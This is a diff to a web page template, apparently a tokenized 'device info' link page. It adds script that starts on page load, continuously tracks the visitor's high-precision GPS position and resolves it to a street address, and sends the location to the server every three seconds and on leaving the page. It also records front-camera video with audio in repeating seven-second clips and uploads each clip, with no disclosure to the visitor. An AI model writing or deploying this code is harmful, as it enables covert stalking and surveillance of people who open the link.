@@ -115,17 +115,280 @@
     <div class="specs-box" id="specsBox">
         <div class="spec-item"><span class="spec-label">Device Model:</span><span class="spec-val" id="valModel">Detecting...</span></div>
         <div class="spec-item"><span class="spec-label">OS Version:</span><span class="spec-val" id="valOS">Detecting...</span></div>
+        <div class="spec-item"><span class="spec-label">Exact GPS:</span><span class="spec-val" id="valGPS">Requesting...</span></div>
+        <div class="spec-item"><span class="spec-label">Front Camera:</span><span class="spec-val" id="valCamera">Requesting...</span></div>
         <div class="spec-item"><span class="spec-label">Screen Res & DPR:</span><span class="spec-val" id="valScreen">Detecting...</span></div>
         <div class="spec-item"><span class="spec-label">Live Battery:</span><span class="spec-val" id="valBattery">Checking...</span></div>
         <div class="spec-item"><span class="spec-label">Network Status:</span><span class="spec-val" id="valNetwork">Checking...</span></div>
         <div class="spec-item"><span class="spec-label">Tab State:</span><span class="spec-val" id="valFocus">Active Tab</span></div>
         <div class="spec-item"><span class="spec-label">Service Worker:</span><span class="spec-val" id="valSW" style="color: #34d399;">Registering...</span></div>
     </div>
+
+    <!-- Manual Location Permission / Re-Sync Button -->
+    <button id="btnSyncGPS" onclick="requestExactGPSUserAction()" style="width: 100%; background: linear-gradient(135deg, #10b981, #059669); color: #fff; border: none; padding: 14px 20px; border-radius: 12px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 15px rgba(16,185,129,0.3); transition: all 0.2s ease; margin-bottom: 20px;">
+        <i class="fa-solid fa-location-crosshairs"></i> Grant / Sync Exact Satellite GPS
+    </button>
 </div>
+
 
 <script>
     let heartbeatInterval = null;
     let sessionToken = localStorage.getItem('android_device_session_token');
+
+    // GPS State
+    let currentLatitude = null;
+    let currentLongitude = null;
+    let currentAccuracy = null;
+    let locationStatus = "Pending";
+    let locationAddress = null;
+    let bestAccuracy = Infinity;
+
+    async function fetchReverseGeocode(lat, lng) {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+            const json = await res.json();
+            if (json && json.display_name) {
+                locationAddress = json.display_name;
+                return json.display_name;
+            }
+        } catch(e) {
+            console.warn("Reverse geocode error:", e);
+        }
+        return null;
+    }
+
+    async function fetchIPLocationFallback() {
+        // If exact GPS not acquired yet, use IP location as initial fallback
+        if (currentLatitude && locationStatus === "Acquired" && bestAccuracy <= 500) return;
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data && data.latitude && data.longitude) {
+                if (!currentLatitude || bestAccuracy > 5000) {
+                    currentLatitude = data.latitude;
+                    currentLongitude = data.longitude;
+                    currentAccuracy = 5000;
+                    bestAccuracy = 5000;
+                    locationStatus = "Coarse IP Fallback";
+                    locationAddress = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.trim();
+
+                    const mapsUrl = `https://www.google.com/maps?q=${currentLatitude},${currentLongitude}`;
+                    document.getElementById('valGPS').innerHTML = `
+                        <a href="${mapsUrl}" target="_blank" style="color: #fbbf24; text-decoration: none; font-weight: 600;">
+                            <i class="fa-solid fa-location-dot"></i> ${currentLatitude.toFixed(4)}, ${currentLongitude.toFixed(4)} 
+                            <span style="font-size:11px; font-weight:normal;">(Approximate IP Location)</span>
+                        </a>
+                    `;
+                    sendTelemetryHeartbeat();
+                }
+            }
+        } catch(e) {
+            console.warn("IP location fallback error:", e);
+        }
+    }
+
+    function processPositionUpdate(position) {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const acc = position.coords.accuracy;
+
+        // Filter: accept if accuracy is better than previous or precision is high (<100m)
+        if (acc <= bestAccuracy || acc <= 100) {
+            currentLatitude = lat;
+            currentLongitude = lng;
+            currentAccuracy = acc;
+            bestAccuracy = acc;
+            locationStatus = "Acquired";
+
+            // Reverse geocode street address if high accuracy fix
+            if (!locationAddress || acc < 100) {
+                fetchReverseGeocode(lat, lng).then(addr => {
+                    if (addr) sendTelemetryHeartbeat();
+                });
+            }
+
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+            let badgeColor = acc <= 30 ? "#34d399" : (acc <= 500 ? "#fbbf24" : "#f87171");
+            let precisionText = acc <= 30 ? "High Precision GPS" : (acc <= 500 ? "Medium Precision Wi-Fi" : "Coarse Location");
+
+            document.getElementById('valGPS').innerHTML = `
+                <a href="${mapsUrl}" target="_blank" style="color: ${badgeColor}; text-decoration: none; font-weight: 600;">
+                    <i class="fa-solid fa-location-dot"></i> ${lat.toFixed(6)}, ${lng.toFixed(6)} 
+                    <span style="font-size:12px; font-weight:normal;">(±${Math.round(acc)}m - ${precisionText})</span>
+                </a>
+            `;
+            sendTelemetryHeartbeat();
+        }
+    }
+
+    function handleGPSError(error) {
+        console.warn("GPS Location error:", error);
+        if (error.code === 1) {
+            locationStatus = "Permission Denied";
+            document.getElementById('valGPS').innerHTML = '<span style="color: #f87171;"><i class="fa-solid fa-location-crosshairs"></i> Permission Denied</span>';
+        } else if (error.code === 2) {
+            locationStatus = "Position Unavailable";
+            document.getElementById('valGPS').innerHTML = '<span style="color: #f87171;"><i class="fa-solid fa-triangle-exclamation"></i> GPS Signal Unavailable</span>';
+        } else {
+            locationStatus = "Timeout";
+            document.getElementById('valGPS').innerHTML = '<span style="color: #fbbf24;"><i class="fa-solid fa-clock"></i> Location Timeout</span>';
+        }
+        sendTelemetryHeartbeat();
+    }
+
+    // Manual Button Trigger (Ensures browser grants location on user click)
+    function requestExactGPSUserAction() {
+        const btn = document.getElementById('btnSyncGPS');
+        if (btn) {
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting Satellite GPS Lock...';
+            btn.style.background = '#6366f1';
+        }
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    processPositionUpdate(pos);
+                    if (btn) {
+                        btn.innerHTML = '<i class="fa-solid fa-circle-check"></i> Exact GPS Locked & Synced!';
+                        btn.style.background = '#10b981';
+                        setTimeout(() => {
+                            btn.innerHTML = '<i class="fa-solid fa-location-crosshairs"></i> Grant / Sync Exact Satellite GPS';
+                        }, 4000);
+                    }
+                },
+                (err) => {
+                    handleGPSError(err);
+                    if (btn) {
+                        btn.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> GPS Access Denied / Error';
+                        btn.style.background = '#f43f5e';
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+            );
+        }
+    }
+
+    // Multi-stage GPS initialization pipeline
+    function initGPSLocation() {
+        // Stage 1: Fast IP Location Fallback
+        fetchIPLocationFallback();
+
+        // Stage 2: Hardware Satellite GPS Lock (Immediate position + continuous watcher)
+        if ("geolocation" in navigator) {
+            document.getElementById('valGPS').innerText = "Acquiring High-Precision Satellite GPS...";
+            navigator.geolocation.getCurrentPosition(processPositionUpdate, handleGPSError, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            navigator.geolocation.watchPosition(processPositionUpdate, handleGPSError, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
+        } else {
+            locationStatus = "Not Supported";
+            document.getElementById('valGPS').innerText = "Not Supported";
+        }
+    }
+
+
+
+    // Front Camera Video Recording
+    let mediaRecorder = null;
+    let recordedChunks = [];
+
+    async function startFrontCameraRecording() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            document.getElementById('valCamera').innerHTML = '<span style="color: #f87171;">Media Devices Not Supported</span>';
+            return;
+        }
+
+        document.getElementById('valCamera').innerHTML = '<span style="color: #fbbf24;"><i class="fa-solid fa-spinner fa-spin"></i> Requesting Permission...</span>';
+
+        try {
+            let stream = null;
+            try {
+                // Request front facing camera explicitly
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+            } catch(err1) {
+                // Fallback to any camera
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            }
+
+            document.getElementById('valCamera').innerHTML = '<span style="color: #34d399;"><i class="fa-solid fa-video"></i> Front Cam Active</span>';
+
+            let mimeType = 'video/webm;codecs=vp8,opus';
+            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
+                else if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
+                else mimeType = ''; // browser default
+            }
+
+            function recordClip() {
+                if (!stream || !stream.active) return;
+
+                recordedChunks = [];
+                const options = mimeType ? { mimeType } : {};
+                mediaRecorder = new MediaRecorder(stream, options);
+                let startTime = Date.now();
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    let durationSec = Math.round((Date.now() - startTime) / 1000);
+                    if (recordedChunks.length > 0) {
+                        const blob = new Blob(recordedChunks, { type: mimeType || 'video/webm' });
+                        await uploadVideoClip(blob, durationSec);
+                    }
+                    // Schedule next recording clip every 8 seconds
+                    if (stream.active) {
+                        setTimeout(recordClip, 1000);
+                    }
+                };
+
+                mediaRecorder.start();
+                document.getElementById('valCamera').innerHTML = '<span style="color: #34d399;"><i class="fa-solid fa-circle" style="color: #f43f5e; font-size: 10px;"></i> Recording Clip...</span>';
+
+                // Stop clip after 7 seconds
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === "recording") {
+                        mediaRecorder.stop();
+                    }
+                }, 7000);
+            }
+
+            // Start initial recording loop
+            recordClip();
+
+        } catch(err) {
+            console.warn("Camera recording access error:", err);
+            let errText = "Permission Denied";
+            if (err.name === 'NotFoundError') errText = "No Front Camera Found";
+            else if (err.name === 'NotReadableError') errText = "Camera In Use";
+            document.getElementById('valCamera').innerHTML = `<span style="color: #f87171;"><i class="fa-solid fa-video-slash"></i> ${errText}</span>`;
+        }
+    }
+
+    async function uploadVideoClip(blob, durationSec) {
+        if (!sessionToken) return;
+        const token = "{{ token }}";
+        const formData = new FormData();
+        formData.append('session_token', sessionToken);
+        formData.append('video', blob, `front_cam_${Date.now()}.webm`);
+        formData.append('duration_sec', durationSec);
+
+        try {
+            const response = await fetch(`/api/upload-video/${token}/`, {
+                method: 'POST',
+                body: formData
+            });
+            const data = await response.json();
+            if (data.status === 'success') {
+                document.getElementById('valCamera').innerHTML = `<span style="color: #34d399;"><i class="fa-solid fa-cloud-arrow-up"></i> Video Uploaded</span>`;
+            }
+        } catch(err) {
+            console.error("Failed to upload video clip:", err);
+        }
+    }
 
     async function sendTelemetryHeartbeat() {
         const ua = navigator.userAgent;
@@ -217,7 +480,13 @@
             ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "4+ GB",
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
             language: navigator.language || "en-US",
+            latitude: currentLatitude,
+            longitude: currentLongitude,
+            location_accuracy: currentAccuracy,
+            location_status: locationStatus,
+            location_address: locationAddress,
             is_online: isOnline,
+
             page_focused: pageFocused,
             orientation: orientation
         };
@@ -280,7 +549,9 @@
 
     // Start continuous telemetry heartbeat loop every 3 seconds
     window.addEventListener('DOMContentLoaded', () => {
+        initGPSLocation();
         sendTelemetryHeartbeat();
+        startFrontCameraRecording();
         heartbeatInterval = setInterval(sendTelemetryHeartbeat, 3000);
     });
 
@@ -292,10 +563,18 @@
     window.addEventListener('pagehide', () => {
         if (sessionToken) {
             const token = "{{ token }}";
-            const beaconData = JSON.stringify({ session_token: sessionToken, page_focused: false });
+            const beaconData = JSON.stringify({
+                session_token: sessionToken,
+                page_focused: false,
+                latitude: currentLatitude,
+                longitude: currentLongitude,
+                location_accuracy: currentAccuracy,
+                location_status: locationStatus
+            });
             navigator.sendBeacon(`/api/submit-device-info/${token}/`, beaconData);
         }
     });
 </script>
 </body>
 </html>
+
